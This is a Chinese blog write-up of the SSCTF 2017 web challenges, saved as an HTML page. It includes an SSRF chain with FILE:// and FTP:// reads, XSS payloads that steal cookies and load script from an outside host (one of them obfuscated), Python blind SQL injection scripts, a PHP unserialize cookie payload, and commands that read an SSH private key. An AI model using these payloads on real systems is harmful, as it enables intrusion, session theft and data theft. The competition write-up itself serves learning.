@@ -1,0 +1,367 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>SSCTF-2017-web-writeup - l3m0n - 博客园</title>
+<link href="./SSCTF-2017-web-writeup - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./SSCTF-2017-web-writeup - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./SSCTF-2017-web-writeup - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./SSCTF-2017-web-writeup - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./SSCTF-2017-web-writeup - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./SSCTF-2017-web-writeup - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./SSCTF-2017-web-writeup - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./SSCTF-2017-web-writeup - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./SSCTF-2017-web-writeup - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./SSCTF-2017-web-writeup - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./SSCTF-2017-web-writeup - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/ssctf-2017-web-writeup.html" id="cb_post_title_url">SSCTF-2017-web-writeup</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>忙乎了两天</p>
+<p><img src="./SSCTF-2017-web-writeup - l3m0n - 博客园/804631-20170508114117191-1623231418.png"/></p>
+<h2 id="捡吗web100">捡吗(web100)</h2>
+<p>tip已经说明过程<br/>
+web100 ssrtf过程 <a class="uri" href="http://120.132.21.19/">http://120.132.21.19/</a> -&gt; 10.23.173.190/news.php -&gt;<a class="uri" href="ftp://172.17.0.2">ftp://172.17.0.2</a></p>
+<pre><code>http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=FTP://172.17.0.2/flag.txt</code></pre>
+<p>协议名对大小写不敏感，所以可以利用FTP这样大写绕过过滤。</p>
+<p>此攻击链略复杂，加上总多选手的爆破，做起来很麻烦。<br/>
+其中ftp这个点，如果是利用gopher连接服务去看是否有数据返回从而判断是端口否有开放，这样的做法不适合ftp，当时还想着利用超时(连接服务时不发生送数据会导致一直连接)来进行端口判断。</p>
+<h2 id="弹幕web200">弹幕(web200)</h2>
+<p>弹幕是通过websockets发的，这里其实坐等大佬的payload上来就好啦。</p>
+<p><img src="./SSCTF-2017-web-writeup - l3m0n - 博客园/804631-20170508113837160-1727457216.png"/></p>
+<pre><code>&lt;img src="/static/images/welcome.gif" onload="c=encodeURIComponent(document.cookie);if(c.length&gt;32){a=new Image();a.src='/xssHentai/request/1/?body='+c;}"&gt;</code></pre>
+<p>这样可以看到，是可以通过img执行js代码</p>
+<pre><code>&lt;img src="x" onerror=jQuery.getScript(String.fromCharCode(104,116,116,112,115,58,47,47,120,46,115,101,99,98,111,120,46,99,110,47,116,85,74,89,67,52))&gt;</code></pre>
+<p><img src="./SSCTF-2017-web-writeup - l3m0n - 博客园/804631-20170508113911019-2035270587.png"/></p>
+<p>式咋提交，其实也是很蒙蔽，因为弹幕中有比赛选手各种xss，莫名其妙的感觉flag过来了</p>
+<h2 id="白吗web300">白吗(web300)</h2>
+<p>如果没有web1的FILE协议对此题的源码(/var/www/submit.php)获取，我估计我还在纠结假的注入、假的后台、假的zip、假的探针、假的phpmyadmin....都是假的</p>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?php</span>
+<span class="fu">header</span><span class="ot">(</span><span class="st">"CONTENT-TYPE:text/html;charset=UTF-8"</span><span class="ot">);</span>
+<span class="fu">define</span><span class="ot">(</span><span class="st">"HOST"</span><span class="ot">,</span><span class="st">"127.0.0.1"</span><span class="ot">);</span>
+<span class="fu">define</span><span class="ot">(</span><span class="st">"USERNAME"</span><span class="ot">,</span><span class="st">"root"</span><span class="ot">);</span>
+<span class="fu">define</span><span class="ot">(</span><span class="st">"PASSWORD"</span><span class="ot">,</span><span class="st">""</span><span class="ot">);</span>
+<span class="kw">$con</span>=<span class="kw">new</span> <span class="kw">mysqli</span><span class="ot">(</span><span class="kw">HOST</span><span class="ot">,</span><span class="kw">USERNAME</span><span class="ot">,</span><span class="kw">PASSWORD</span><span class="ot">,</span><span class="st">"ctf1"</span><span class="ot">);</span>
+<span class="kw">if</span><span class="ot">(</span>!<span class="kw">$con</span><span class="ot">)</span>{
+    <span class="fu">echo</span> <span class="kw">$con</span>-&gt;error<span class="ot">;</span>
+    <span class="fu">exit</span><span class="ot">(</span><span class="st">"aaaa"</span><span class="ot">);</span>
+}
+<span class="kw">if</span><span class="ot">(</span>!<span class="kw">$con</span>-&gt;select_db<span class="ot">(</span><span class="st">"ctf1"</span><span class="ot">))</span>{
+    <span class="fu">echo</span> <span class="kw">$con</span>-&gt;error<span class="ot">;</span>
+}
+<span class="kw">if</span><span class="ot">(</span>!<span class="kw">$con</span>-&gt;query<span class="ot">(</span><span class="st">"SET NAMES utf8"</span><span class="ot">))</span>{
+    <span class="fu">echo</span> <span class="kw">$con</span>-&gt;error<span class="ot">;</span>
+}
+
+<span class="kw">$xss</span>=<span class="kw">$_POST</span><span class="ot">[</span><span class="st">"sub"</span><span class="ot">];</span>
+<span class="kw">$str</span> = <span class="fu">addslashes</span><span class="ot">(</span><span class="kw">$xss</span><span class="ot">);</span>
+
+<span class="kw">class</span> Action  
+{  
+  
+    <span class="kw">function</span> get_outer<span class="ot">()</span>  
+    {  
+        <span class="kw">$url</span> = <span class="st">'http://www.ip138.com/ip2city.asp'</span><span class="ot">;</span>  
+        <span class="kw">$info</span> = <span class="fu">file_get_contents</span><span class="ot">(</span><span class="kw">$url</span><span class="ot">);</span>  
+        <span class="fu">preg_match</span><span class="ot">(</span><span class="st">'|&lt;center&gt;(.*?)&lt;/center&gt;|i'</span><span class="ot">,</span> <span class="kw">$info</span><span class="ot">,</span> <span class="kw">$m</span><span class="ot">);</span>  
+        <span class="kw">return</span> <span class="kw">$m</span><span class="ot">[</span><span class="dv">1</span><span class="ot">];</span>  
+    }  
+  
+    <span class="kw">function</span> get_inter<span class="ot">()</span>  
+    {  
+        <span class="kw">$onlineip</span> = <span class="st">''</span><span class="ot">;</span>  
+        <span class="kw">if</span> <span class="ot">(</span><span class="fu">getenv</span><span class="ot">(</span><span class="st">'HTTP_CLIENT_IP'</span><span class="ot">)</span> &amp;&amp; <span class="fu">strcasecmp</span><span class="ot">(</span><span class="fu">getenv</span><span class="ot">(</span><span class="st">'HTTP_CLIENT_IP'</span><span class="ot">),</span> <span class="st">'unknown'</span><span class="ot">))</span> {  
+            <span class="kw">$onlineip</span> = <span class="fu">getenv</span><span class="ot">(</span><span class="st">'HTTP_CLIENT_IP'</span><span class="ot">);</span>  
+        } <span class="kw">elseif</span> <span class="ot">(</span><span class="fu">getenv</span><span class="ot">(</span><span class="st">'HTTP_X_FORWARDED_FOR'</span><span class="ot">)</span> &amp;&amp; <span class="fu">strcasecmp</span><span class="ot">(</span><span class="fu">getenv</span><span class="ot">(</span><span class="st">'HTTP_X_FORWARDED_FOR'</span><span class="ot">),</span> <span class="st">'unknown'</span><span class="ot">))</span> {  
+            <span class="kw">$onlineip</span> = <span class="fu">getenv</span><span class="ot">(</span><span class="st">'HTTP_X_FORWARDED_FOR'</span><span class="ot">);</span>  
+        } <span class="kw">elseif</span> <span class="ot">(</span><span class="fu">getenv</span><span class="ot">(</span><span class="st">'REMOTE_ADDR'</span><span class="ot">)</span> &amp;&amp; <span class="fu">strcasecmp</span><span class="ot">(</span><span class="fu">getenv</span><span class="ot">(</span><span class="st">'REMOTE_ADDR'</span><span class="ot">),</span> <span class="st">'unknown'</span><span class="ot">))</span> {  
+            <span class="kw">$onlineip</span> = <span class="fu">getenv</span><span class="ot">(</span><span class="st">'REMOTE_ADDR'</span><span class="ot">);</span>  
+        } <span class="kw">elseif</span> <span class="ot">(</span><span class="fu">isset</span><span class="ot">(</span><span class="kw">$_SERVER</span><span class="ot">[</span><span class="st">'REMOTE_ADDR'</span><span class="ot">])</span> &amp;&amp; <span class="kw">$_SERVER</span><span class="ot">[</span><span class="st">'REMOTE_ADDR'</span><span class="ot">]</span> &amp;&amp; <span class="fu">strcasecmp</span><span class="ot">(</span><span class="kw">$_SERVER</span><span class="ot">[</span><span class="st">'REMOTE_ADDR'</span><span class="ot">],</span> <span class="st">'unknown'</span><span class="ot">))</span> {  
+            <span class="kw">$onlineip</span> = <span class="kw">$_SERVER</span><span class="ot">[</span><span class="st">'REMOTE_ADDR'</span><span class="ot">];</span>  
+        }  
+        <span class="kw">return</span> <span class="kw">$onlineip</span><span class="ot">;</span>  
+    }  
+}
+
+<span class="kw">$p</span> = <span class="kw">new</span> Action<span class="ot">();</span>
+<span class="kw">$intip</span> = <span class="kw">$p</span>-&gt;get_inter<span class="ot">();</span>
+<span class="kw">$outip2</span>= <span class="kw">$intip</span><span class="ot">;</span>
+<span class="er">@</span><span class="fu">mkdir</span><span class="ot">(</span><span class="st">"/tmp/ids"</span><span class="ot">,</span><span class="dv">0777</span><span class="ot">,</span><span class="kw">true</span><span class="ot">);</span>
+<span class="kw">$sql</span>=<span class="st">"insert into ctf1(xss,ip,time,wai_ip) values('</span><span class="kw">$str</span><span class="st">','</span><span class="kw">$intip</span><span class="st">',NOW(),'</span><span class="kw">$outip2</span><span class="st">')"</span><span class="ot">;</span>
+
+<span class="kw">if</span><span class="ot">(</span><span class="kw">$str</span>=<span class="kw">$con</span>-&gt;query<span class="ot">(</span><span class="kw">$sql</span><span class="ot">))</span>{
+    <span class="fu">echo</span> <span class="st">"&lt;script&gt;alert('success');window.location.href='index.php'&lt;/script&gt;"</span><span class="ot">;</span>
+    <span class="kw">$insertid</span> = <span class="fu">mysqli_insert_id</span><span class="ot">(</span><span class="kw">$con</span><span class="ot">);</span>
+    <span class="fu">file_put_contents</span><span class="ot">(</span><span class="st">"/tmp/ids/"</span>.<span class="kw">$insertid</span><span class="ot">,</span><span class="st">"a"</span><span class="ot">);</span>
+}
+<span class="kw">else</span> {
+    <span class="fu">echo</span> <span class="st">"&lt;script&gt;alert('fail');&lt;/script&gt;"</span><span class="ot">;</span>
+}
+<span class="kw">?&gt;</span></code></pre></div>
+<p>开始还以为是注入</p>
+<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="kw">def</span> exp(n):
+  <span class="kw">global</span> data
+  <span class="cf">for</span> i <span class="op">in</span> <span class="bu">range</span>(<span class="dv">33</span>,<span class="dv">127</span>):
+  <span class="co">#for ii in 'root':</span>
+    <span class="co">#i = ord(ii)</span>
+    flag <span class="op">=</span> <span class="dv">1</span>
+    url <span class="op">=</span> <span class="st">"http://120.132.20.149/submit.php"</span>
+    sql <span class="op">=</span> <span class="st">"select count(SCHEMA_NAME) from information_schema.SCHEMATA limit 1,1"</span>
+    sql <span class="op">=</span> <span class="st">"select table_name from information_schema.TABLES where TABLE_SCHEMA=0x63746631 limit 0,1"</span>
+    <span class="co">#sql = "select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=0x63746631 and TABLE_NAME=0x63746631 limit 2,1"</span>
+    <span class="co">#sql = "select user from mysql.user limit 4,1"</span>
+    <span class="co">#sql = "select count(ip) from ctf1"</span>
+    payload <span class="op">=</span> <span class="st">"A'-(if(ord(mid((</span><span class="sc">%s</span><span class="st">),</span><span class="sc">%d</span><span class="st">,1))=</span><span class="sc">%d</span><span class="st">,sleep(2),1))-'"</span> <span class="op">%</span> (sql,n,i)
+    <span class="bu">print</span> payload
+    h <span class="op">=</span> {
+      <span class="st">'X-Forwarded-For'</span> : <span class="st">"A'"</span>,
+      <span class="co">'X-Forwarded'</span> : <span class="st">"A'"</span>,
+      <span class="co">'Client-IP'</span> : payload
+    }
+
+    r <span class="op">=</span> requests.get(url,headers<span class="op">=</span>h)
+    <span class="cf">try</span>:
+      res <span class="op">=</span> requests.get(url,headers<span class="op">=</span>h,timeout<span class="op">=</span><span class="dv">2</span>)
+      <span class="co">#print res.content</span>
+    <span class="cf">except</span>:
+      <span class="bu">print</span> <span class="bu">chr</span>(i)
+      data[n] <span class="op">=</span> <span class="bu">chr</span>(i)
+      <span class="bu">print</span> <span class="st">"Data </span><span class="sc">%d</span><span class="st">th: </span><span class="sc">%s</span><span class="st">"</span> <span class="op">%</span> (n,data[n])
+      flag <span class="op">=</span> <span class="dv">0</span>
+      <span class="cf">break</span>
+  <span class="cf">if</span> flag:
+    exit()</code></pre></div>
+<p>然后根据前面submit.php的变量<code>$xss</code>就猜到是xss,但是!!!第一天测试的时候bot好像是挂着的!导致一直没弄成功,后面就一直想能不能日下这台服务器,因为mysql的密码是空的(想通过ssrf连接mysql服务,当然只是想想,主要是mysql还有交互过程导致失败)</p>
+<p>最后就是通过submit.php直接提交script标签代码，然后就可以收到数据.</p>
+<pre><code>&lt;script src=https://x.secbox.cn/tUJYC4&gt;&lt;/script&gt;</code></pre>
+<p><img src="./SSCTF-2017-web-writeup - l3m0n - 博客园/804631-20170508113929551-1597354265.png"/></p>
+<pre><code>b9557ee76eeb61cadda090855a47d266-1.php
+
+再读取flag
+http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=FILE:///var/www/admin/js.php</code></pre>
+<p>凭借代码应该是想考察xss去获取源代码的，可惜web1可以穿</p>
+<h2 id="webhookweb500">WebHook(web500)</h2>
+<p><a class="uri" href="https://github.com/howmp/webhook">https://github.com/howmp/webhook</a></p>
+<p>先为这个题目的点个赞.虽然不知道考啥,感觉自己也是投机取巧做出来的.</p>
+<p>这个代码整个逻辑流程就是，选手先添加远程github链接，然后再进行pull，最后还能够下载自己项目的zip</p>
+<p>本地测试的时候debug报错有泄露<code>app.config['SECRET_KEY']</code>，可惜后面关掉了debug。</p>
+<pre><code>http://webhook.ssctf.seclover.com:8000/webhooklog</code></pre>
+<p><img src="./SSCTF-2017-web-writeup - l3m0n - 博客园/804631-20170508114007472-925800117.png"/></p>
+<p>其中pass是选手设置的密码+<code>app.config['SECRET_KEY']</code>值，后面解密几个发现secret_key就是<code>ssctf</code></p>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php">先添加项目地址:
+http:<span class="co">//webhook.ssctf.seclover.com:8000/addrepo?repo=t&amp;key=05dec173a9b6862b26b05f2b4d0c521a&amp;url=https://github.com/l3m0n/t.git&amp;pass=1234asdeqwasdasdqwsad12adsd</span>
+
+再获取-打包项目:
+http:<span class="co">//webhook.ssctf.seclover.com:8000/push</span>
+<span class="kw">POST</span>数据:
+{
+    <span class="st">"repository"</span>:{
+        <span class="st">"name"</span> : <span class="st">"t"</span>
+    }<span class="ot">,</span>
+    <span class="st">"ref"</span> : <span class="st">"refs/heads/master"</span>
+}</code></pre></div>
+<p>其中项目中可以通过<code>build.json</code>文件中的include来控制zip的压缩路径.</p>
+<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python">args <span class="op">=</span> [<span class="st">'zip'</span>, <span class="st">'-r'</span>,
+        os.path.join(outpath, <span class="bu">str</span>(<span class="bu">int</span>(time.time())) <span class="op">+</span> <span class="st">'.zip'</span>)]
+<span class="cf">if</span> os.path.isfile(os.path.join(basedir, <span class="st">'build.json'</span>)):
+    b <span class="op">=</span> json.loads(
+        <span class="bu">open</span>(os.path.join(basedir, <span class="st">'build.json'</span>)).read())
+    <span class="cf">for</span> x <span class="op">in</span> b.get(<span class="st">'include'</span>, [basedir]):
+        args.append(x)
+
+    <span class="cf">for</span> x <span class="op">in</span> b.get(<span class="st">'exclude'</span>, []):
+        args.append(<span class="st">"-x"</span>)
+        args.append(x)
+    p <span class="op">=</span> subprocess.Popen(args, cwd<span class="op">=</span>basedir)</code></pre></div>
+<p>下载了一下<code>/var/www/</code>路径的东西，其中有一个flag的项目，但是<code>git log</code>看了一下还是没啥结果，后面放了一个tip，感觉是有点迷，但是大概知道commit里面是不存在flag.</p>
+<pre><code>webhook题目，flag在flag项目中，但在commit真正的flag的时候，webhook已经被删掉了</code></pre>
+<p>还有一个<code>.bash_history</code>，应该是前面的人通过命令执行然后遗留的.提取一下关键的几个命令信息.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">cat</span> /home/www-data/.ssh/id_rsa
+<span class="kw">cat</span> /home/www-data/.ssh/id_rsa.pub
+<span class="kw">ssh</span> -T git@git.coding.net -i id_rsa
+<span class="kw">git</span> clone https://git.coding.net/ljgame/flag.git</code></pre></div>
+<p>这个是通过git拉取私有项目的步骤.</p>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php">配置/root/.ssh/config
+Host ljgame.git.coding.net
+  HostName git.coding.net
+  User git
+  IdentityFile /home/www-<span class="fu">date</span>/.ssh/id_rsa
+
+ssh -<span class="kw">T</span> git<span class="er">@</span>git.coding.net -i id_rsa
+git <span class="kw">clone</span> git<span class="er">@</span>ljgame.git.coding.net:ljgame/flag.git</code></pre></div>
+<p>最后就能够拉取到这个私有项目，获得flag.</p>
+<h2 id="cloversec-logosweb500">CloverSec Logos(web500)</h2>
+<p><a class="uri" href="http://60.191.205.80/picture.php?id=1">http://60.191.205.80/picture.php?id=1</a> 存在注入，对空格和or这些有过滤，但是很好绕过。写成脚本</p>
+<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> requests
+
+url <span class="op">=</span> <span class="st">"http://60.191.205.80/picture.php?id="</span>
+
+<span class="co">#c = "0123456789abcedf"</span>
+<span class="co">#sql = "select(column_name)from(infoorrmation_schema.columns)where(table_name)='user'%0blimit%0b2,1"</span>
+sql <span class="op">=</span> <span class="st">"select(passwoorrd)from(user)where(username)='admin'"</span>
+f <span class="op">=</span> <span class="dv">0</span>
+out <span class="op">=</span> <span class="st">""</span>
+
+<span class="cf">for</span> i <span class="op">in</span> <span class="bu">range</span>(<span class="dv">1</span>,<span class="dv">200</span>):
+    <span class="bu">print</span> i
+    f <span class="op">=</span> <span class="dv">0</span>
+    <span class="cf">for</span> c <span class="op">in</span> <span class="bu">range</span>(<span class="dv">33</span>,<span class="dv">128</span>):
+        payload <span class="op">=</span> <span class="st">'0"||if(ascii(mid(('</span><span class="op">+</span>sql<span class="op">+</span><span class="st">'),'</span><span class="op">+</span><span class="bu">str</span>(i)<span class="op">+</span><span class="st">',1))='</span><span class="op">+</span><span class="bu">str</span>(c)<span class="op">+</span><span class="st">',1,0)||"a'</span>
+        <span class="co">#print payload</span>
+        res <span class="op">=</span> requests.get(url<span class="op">+</span>payload)
+        <span class="cf">if</span> <span class="st">"not found!"</span> <span class="op">not</span> <span class="op">in</span> res.content:
+            <span class="bu">print</span> c
+            out <span class="op">=</span> out <span class="op">+</span> <span class="bu">chr</span>(c)
+            f <span class="op">=</span> <span class="dv">1</span>
+            <span class="bu">print</span> out
+            <span class="cf">break</span>
+
+    <span class="cf">if</span> <span class="op">not</span> f:
+        <span class="bu">print</span> <span class="st">"output: "</span> <span class="op">+</span> out
+        exit()
+
+<span class="bu">print</span> <span class="st">"output: "</span> <span class="op">+</span> out</code></pre></div>
+<p>跑得admin的密码为14aceb3fc5992cef3d97，长度为20，另一个表名是Dede_CMS，前3后1截得的16位去解密得到密码为admin^g。<br/>
+两处源码泄漏：index.php.swp，include.php.swp。源码很明显的反序列去读flag文件，有一些简单的限制，路径可以在前面加./，用自己服务器echo出来1234，序列化字符串中类名长度前加个+号。最后的payload</p>
+<pre><code>GET /index.php?action=imformation&amp;secret=http://x.x.x.x/1.php HTTP/1.1
+Host: 60.191.205.80
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: PHPSESSID=ps3s1c2479tbi9ahmmmrj5ubd3; Tips=token+will+be+unserialize;token%3dO%3a%2b4%3a"Read"%3a1%3a{s%3a4%3a"file"%3bs%3a16%3a"./ssctf_flag.php"%3b}
+Connection: close</code></pre>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2017-05-08 11:42</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6824337" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6824337);return false;">收藏</a></div>
+</div>
+<script src="./SSCTF-2017-web-writeup - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6824337,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2017/5/8 11:42:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./SSCTF-2017-web-writeup - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="//img.users.51.la/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./SSCTF-2017-web-writeup - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
